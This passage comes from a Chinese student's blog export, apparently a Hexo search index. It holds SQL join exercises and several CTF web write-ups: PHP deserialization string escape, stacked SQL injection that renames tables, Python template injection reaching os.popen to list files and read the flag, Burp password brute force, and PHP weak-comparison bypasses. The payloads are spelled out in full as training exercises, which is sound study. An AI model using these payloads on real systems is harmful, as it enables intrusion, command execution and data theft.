class="hljs-keyword">ON</span> c.course_id <span class="hljs-operator">=</span> g.course_id<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> c.course_id, c.course_name;<br></code></pre></td></tr></table></figure><p>查询所有学生的选修课程情况和成绩，若学生没有选修任何课程，也要包含在其中。</p><p>也是左链接，同理。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <br>    c.course_id,<br>    c.course_name,<br>    s.student_id,<br>    s.student_name<br><span class="hljs-keyword">FROM</span> grades_info g<br><span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">JOIN</span> courses_info c <span class="hljs-keyword">ON</span> g.course_id <span class="hljs-operator">=</span> c.course_id<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> students_info s <span class="hljs-keyword">ON</span> g.student_id <span class="hljs-operator">=</span> s.student_id<br><br></code></pre></td></tr></table></figure><p>查询被选修了的课程的选修情况和所有开设课程名，包括没有被选修的课程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <br>    c.course_name,<br>    GROUP_CONCAT(s.student_name) <span class="hljs-keyword">AS</span> students_enrolled<br><span class="hljs-keyword">FROM</span> courses_info c<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> grades_info g <span class="hljs-keyword">ON</span> c.course_id <span class="hljs-operator">=</span> g.course_id<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> students_info s <span class="hljs-keyword">ON</span> g.student_id <span class="hljs-operator">=</span> s.student_id<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> c.course_name<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> c.course_name;<br></code></pre></td></tr></table></figure><p>在学生信息表中，查询年龄比“王林”大的学生的学号，姓名，年龄</p><p>用 YEAR()函数转换为 int 再相减</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span><br>    s1.student_id,<br>    s1.student_name,<br>    <span class="hljs-keyword">YEAR</span>(<span class="hljs-built_in">CURRENT_DATE</span>) <span class="hljs-operator">-</span> <span class="hljs-keyword">YEAR</span>(s1.birthday) <span class="hljs-keyword">AS</span> age<br><span class="hljs-keyword">FROM</span> students_info s1<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> students_info s2 <span class="hljs-keyword">ON</span> s1.student_id <span class="hljs-operator">!=</span> s2.student_id<br><span class="hljs-keyword">WHERE</span> s2.student_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;王林&#x27;</span> <span class="hljs-keyword">AND</span> s1.birthday <span class="hljs-operator">&gt;</span> s2.birthday<br></code></pre></td></tr></table></figure><p>将“student_view3”视图的内容修改为：“数据库系统原理”课程所选修学生的专业名称和各个专业的选课学生人数</p><p>这里用 CREATE OR REPLACE 修改视图，然后 FROM 这边可以从一个查询结果里的表选取，用 AS t 重新命名为 t，这里就可以体现出数据库查询思路了，由简单再到复杂，将复杂的语句拆开成几个部分，实现了各个部分再合并。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">VIEW</span> student_view3 <span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> t.major_name,<span class="hljs-built_in">COUNT</span>(t.student_id) <span class="hljs-keyword">AS</span> numbers<br><span class="hljs-keyword">FROM</span> <br>(<span class="hljs-keyword">SELECT</span> m.major_name, s.student_id<br><span class="hljs-keyword">FROM</span> students_info <span class="hljs-keyword">AS</span> s<br><span class="hljs-keyword">JOIN</span> major_info <span class="hljs-keyword">AS</span> m <span class="hljs-keyword">ON</span> s.major_id <span class="hljs-operator">=</span> m.major_id) <span class="hljs-keyword">AS</span> t<br><span class="hljs-keyword">JOIN</span> grades_info <span class="hljs-keyword">AS</span> g <span class="hljs-keyword">ON</span> t.student_id <span class="hljs-operator">=</span> g.student_id<br><span class="hljs-keyword">JOIN</span> courses_info <span class="hljs-keyword">AS</span> c <span class="hljs-keyword">ON</span> c.course_id <span class="hljs-operator">=</span> g.course_id<br><span class="hljs-keyword">WHERE</span> c.course_name <span class="hljs-operator">=</span> &quot;数据库原理&quot;<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t.major_name;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据库基础</category>
      
      <category>SQL实践部分</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【月饼杯】Serialize - str_replace字符逃逸</title>
    <link href="/2023/10/08/Serialize-%E6%B3%A8%E5%85%A5-str-replace%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2023/10/08/Serialize-%E6%B3%A8%E5%85%A5-str-replace%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Serialize-注入-str-replace漏洞利用"><a href="#Serialize-注入-str-replace漏洞利用" class="headerlink" title="Serialize 注入 - str_replace漏洞利用"></a>Serialize 注入 - str_replace漏洞利用</h1><p>题目来自月饼杯 web1_此夜圆<br>题目代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;?php<br><span class="hljs-title function_">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span><br>&#123;<br>    public $uname;<br>    public $password;<br>    public <span class="hljs-keyword">function</span> <span class="hljs-title function_">__construct</span>(<span class="hljs-params">$uname,$password</span>)<br>    &#123;<br>        $this-&gt;uname=$uname;<br>        $this-&gt;password=$password;<br>    &#125;<br>    public <span class="hljs-keyword">function</span> <span class="hljs-title function_">__wakeup</span>(<span class="hljs-params"></span>)<br>    &#123;<br>            <span class="hljs-keyword">if</span>($this-&gt;password===<span class="hljs-string">&#x27;yu22x&#x27;</span>)<br>            &#123;<br>                <span class="hljs-title function_">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                echo $flag;    <br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                echo <span class="hljs-string">&#x27;wrong password&#x27;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">$string</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">str_replace</span>(<span class="hljs-string">&#x27;Firebasky&#x27;</span>,<span class="hljs-string">&#x27;Firebaskyup&#x27;</span>,$string);<br>&#125;<br><br>$uname=$_GET[<span class="hljs-number">1</span>];<br>$password=<span class="hljs-number">1</span>;<br>$ser=<span class="hljs-title function_">filter</span>(<span class="hljs-title function_">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">a</span>($uname,$password)));<br>$test=<span class="hljs-title function_">unserialize</span>($ser);<br>?&gt;<br><br></code></pre></td></tr></table></figure><p>这里我们发现__wakeup()函数里才有获取到 flag 的函数，不能绕过，这里只有一个 GET 修改 uname，说明就是要在 serialize 里覆盖 password 来获取到 flag。<br>看到有一个 filter 函数会套在 serialize 函数外面，这种格式会导致序列化后字符个数不匹配，在反序列化过程中，他会按照字符个数去匹配参数内容，如果不匹配那么 wakeup 函数就会失效，该参数也会清空，这里每出现一个Firebasky就会多两个字符，这样的话就允许我们模仿序列化后的格式去定义 password 来覆盖掉后面的 password，构造 password 会多下面这一部分。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;yu22x&quot;</span>;&#125;&quot;<br></code></pre></td></tr></table></figure><p>这里记得用 <strong>;}”</strong> 来结束结构，让后面的 password 无效。<br>一共多了 30 个字符，刚好是偶数，我们在 uname 里填入 15 个Firebasky，多出来的 15 个 up 就刚刚好把这部分掩盖掉，故构造 payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?<span class="hljs-number">1</span>=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:5:&quot;</span>yu22x<span class="hljs-string">&quot;;&#125; </span><br></code></pre></td></tr></table></figure><p>即可获得 flag。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【攻防世界】mysql 注入 1</title>
    <link href="/2023/09/19/mysql-inject1/"/>
    <url>/2023/09/19/mysql-inject1/</url>
    
    <content type="html"><![CDATA[<h3 id="SQL注入-更改表"><a href="#SQL注入-更改表" class="headerlink" title="SQL注入-更改表"></a>SQL注入-更改表</h3><p>打开题目，我们看到：<br><img src="/2023/09/19/mysql-inject1/image1.jpg"><br>猜测是考察 sql 注入，我们输入1’查看是否有注入机会：<br><img src="/2023/09/19/mysql-inject1/image2.jpg"><br>可以看到成功执行了，所以我们要查看能在这个数据库中获取到什么信息，执行语句：<br>“1’;show tables #”<br>这里的用单引号将查询语句结束，并用#注释掉后面的引号防止报错，这里的 show databases 就会执行了。<br><img src="/2023/09/19/mysql-inject1/image3.jpg"><br>可以看到两个表，”1919810931114514”和“words”，我们先试一下能不能直接查询表，使用：<br>“1’;select * from `1919810931114514` # 发现：<br><img src="/2023/09/19/mysql-inject1/image4.jpg"><br>禁用了以上语句，那我们就要想办法怎么拿到信息了，我们看到窗口有一个功能，这个功能多半是查询语句构造1’ or 1&#x3D;1 #查询表内所有内容，没有发现 flag，说明不在这个表，这代表我们要替换表，构造：<br>“1’;show columns from `1919810931114514` #<br>发现了 flag：<br><img src="/2023/09/19/mysql-inject1/image5.jpg"><br>那说明这个查询语句默认在表 word 里，题目似乎没有禁用 rename 和 alter，我们采取更改预设表的形式来获取 flag，构造：<br>1’; rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;<br>alter tables `words` change `flag` `id` varchar(100); #<br>去更改flag 在的表，并按照根据id 的格式去更改 flag，让查询语句对 flag 生效，更改后，构造：<br>1’ or 1&#x3D;1 #<br>查询所有内容即可获取到 flag。<br><img src="/2023/09/19/mysql-inject1/image6.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【攻防世界】 easy_python 模板注入1</title>
    <link href="/2023/09/18/python-template1/"/>
    <url>/2023/09/18/python-template1/</url>
    
    <content type="html"><![CDATA[<h3 id="Python-模板注入"><a href="#Python-模板注入" class="headerlink" title="Python 模板注入"></a>Python 模板注入</h3><p>拿到题目，直接告诉我们是 python template 问题，以 python 模板注入的角度切入。<br>对于很多网站，为了方便，都会套用一个 html 模板，模板会给一个接口，用 python 将这段代码以作为变量的形式套入进模板。<br>这里的模板注入就是，我们可以在这个变量里面注入我们想要的代码，获取到信息，注入的时候用花括号“{ {} }”包裹住 code。本题中，我们测试{ {1+5} }：<br><img src="/2023/09/18/python-template1/image1.jpg"><br>果不其然，代码执行了，返回了 6，接下来进行正式的注入，常见的注入方法有以下几种：<br>以下所有的方法均要被“__” 包裹</p><ul><li>__class__ ： 返回对象所属的类。</li><li>__mro__ : 返回基类元组。</li><li>__base__：返回基类。</li><li>__subclasses__()[]：返回子类。</li><li>__init__ ：初始化类。</li><li>__globals[]__ ： 对包含函数全局变量的字典的引用，说人话就是调用全局的包，如’os’等。</li></ul><p>在注入之后我们通常使用两种方法来操控控制台获取信息：</p><ul><li>os.popen(“file_name”) ：返回文件内容。</li><li>os.system ： 返回状态码。</li></ul><p>开始操作，构造 [].__class__.__mro__ 并发送：<br><img src="/2023/09/18/python-template1/image2.jpg"><br>可以看到获取到了两个基类，我们选用 mro[1] 获取其中一个基类，然后再在这个基类里面调取他所有可用的子类，构造 [].__class__.__mro__[1].__subclasses__() 发送，获取到所有子类：<br><img src="/2023/09/18/python-template1/image3.jpg"><br>我们要找到 os.popen 的基类site._Printer类，用它来调用 popen，对此，我们先要找到 site._Printer在subclasses 中的索引，调用以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot; &quot;</span>                  <span class="hljs-comment">#输入所有 subclasses 内容</span><br>str_new = []<br>sub_str = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>[i]!=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>[i]!=<span class="hljs-string">&quot; &quot;</span>:<br>        sub_str+=<span class="hljs-built_in">str</span>[i]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>[i]==<span class="hljs-string">&#x27;,&#x27;</span>:<br>        str_new.append(sub_str)<br>        sub_str = <span class="hljs-string">&#x27;&#x27;</span><br>result = str_new.index(<span class="hljs-string">&quot;&lt;class&#x27;site._Printer&#x27;&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>))<br>result<br><br></code></pre></td></tr></table></figure><p>获取到结果为 71，我们定位到 subclasses 中第71 个元素，并初始化这个类，调用他的全局变量 os 下的 popen 函数，这里使用‘ls’来查看所有文件。<br>于是构造 :<br>[].__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[‘os’].popen(‘ls’).read()<br>获得结果：<br><img src="/2023/09/18/python-template1/image4.jpg"><br>这里用空格隔开了几个文件，发现了有fl4g文件，我们在 popen 里使用 cat fl4g去读他里面的内容(记得要用%20 代替空格，不然 url 不一定在 safari 有效)<br>[].__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[‘os’].popen(‘cat%20fl4g’’).read()<br>得到 flag：<br><img src="/2023/09/18/python-template1/image5.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【攻防世界】weak_auth 密码爆破</title>
    <link href="/2023/09/18/easy-blast/"/>
    <url>/2023/09/18/easy-blast/</url>
    
    <content type="html"><![CDATA[<h3 id="简单密码爆破"><a href="#简单密码爆破" class="headerlink" title="简单密码爆破"></a>简单密码爆破</h3><p>打开题目后，看到一个登录页面.<br><img src="/2023/09/18/easy-blast/image1.jpg"><br>我们先随机输入一些东西进去，看看效果：<br><img src="/2023/09/18/easy-blast/image2.jpg"><br>看到 login as admin，我们将用户名改为 admin 后，发现弹出窗口不一样。于是就锁定了用户名是 admin，然后对密码进行爆破。<br>使用 burp 进行爆破，选用爆破字典，更改参数：<br><img src="/2023/09/18/easy-blast/image3.jpg"><br><img src="/2023/09/18/easy-blast/image4.jpg"><br>进行爆破后我们发现，密码“123456”获取到的响应包的长度显著不同，点开查看后，发现已经成功登录并获取到 flag。<br><img src="/2023/09/18/easy-blast/image5.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【攻防世界】simplePHP PHP代码审计</title>
    <link href="/2023/09/16/artical-simplephp/"/>
    <url>/2023/09/16/artical-simplephp/</url>
    
    <content type="html"><![CDATA[<h3 id="EASY-PHP漏洞"><a href="#EASY-PHP漏洞" class="headerlink" title="EASY　PHP漏洞"></a>EASY　PHP漏洞</h3><p>打开 simplephp 这道题我们拿到的信息。<br><img src="/2023/09/16/artical-simplephp/image_question.jpg"><br>首先是可以看到代码中有两个 GET，说明这道题可以通过构造 url GET请求来渗透。<br>代码中出现了”&#x3D;&#x3D;”，这个在 php 中是弱类型比较，弱类型比较与“&#x3D;&#x3D;&#x3D;”不同，不会要求他们格式也相同，而是会先将两个不同格式的变量转换为相同格式再比较，对于“$a&#x3D;&#x3D;0&amp;&amp;a”我们可以通过构造 0 的 url 编码来绕过，首先 GET 请求的时候会先一次解码，所以这里的 0 我们要二次编码，编码成%2530，然后在&#x3D;&#x3D;这里会转换成 0 通过，在判 a 为真这里也会通过，因为不会转换类型。<br>对于 b 的构造，要求其大于 1234，首先先来了解 php 中的各类型转换：<br>string -&gt; int，会扔掉除了 int 类型以外的所有符号，在 php 比较里面也是这样，比如拿字符串和 int 类型做比较，会导致字符串类型过滤掉除了 int 以外的，所以不能比较 ascii 码。<br>以此类推，会转换成被对比对象的格式，其他格式一律清除。<br>php 代码：<br><img src="/2023/09/16/artical-simplephp/image_code.jpg"><br>结果：<br><img src="/2023/09/16/artical-simplephp/image_result.jpg"><br>所以在这里，b 那边有个判断是否是数字类型的函数，我们需要绕过这个函数，所以必须是字符串形式，又要要求大于 1234，于是我们构造 b&#x3D;1235a （前面的数字比 1234 大）即可。<br>对于此题，我们构造：<br>&#x2F;?a&#x3D;a&#x3D;%2530&amp;&amp;b&#x3D;%34%34%34%34%41 即可获得 flag。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【攻防世界】robotstxt</title>
    <link href="/2023/09/15/robotstxt/"/>
    <url>/2023/09/15/robotstxt/</url>
    
    <content type="html"><![CDATA[<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>robots.txt 文件是一个文本文件，使用任何一个常见的文 本编辑器，比如 Windows 系统自带的 Notepad，就可以创建和编辑它。robots.txt 是一个协议，而不是一个命令。 robots.txt 是搜索引擎中访问网站的时候要查看的第一个 文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件 是可以被查看的。</p><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>robots.txt 常用于过滤掉不希望搜索引擎能搜索出来的文件，这种文件常常是敏感的，本体中，如下：<br><img src="/2023/09/15/robotstxt/image1.jpg"><br>在获取到&#x2F;fl0g.php的信息后，放在url里 get 请求即可获取到 flag。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>about</title>
    <link href="/2023/09/15/about/"/>
    <url>/2023/09/15/about/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="关于博客"><a href="#关于博客" class="headerlink" title="关于博客"></a>关于博客</h2><p>这是一个用于记录学习笔记的博客，包括日常学习和练习题，比赛赛题的 WriteUp。</p><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>中山大学软件工程学院学生&#x2F;CTFer Web 方向&#x2F;音游玩家<br>我的 QQ：1789697833<br>欢迎来找我玩！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
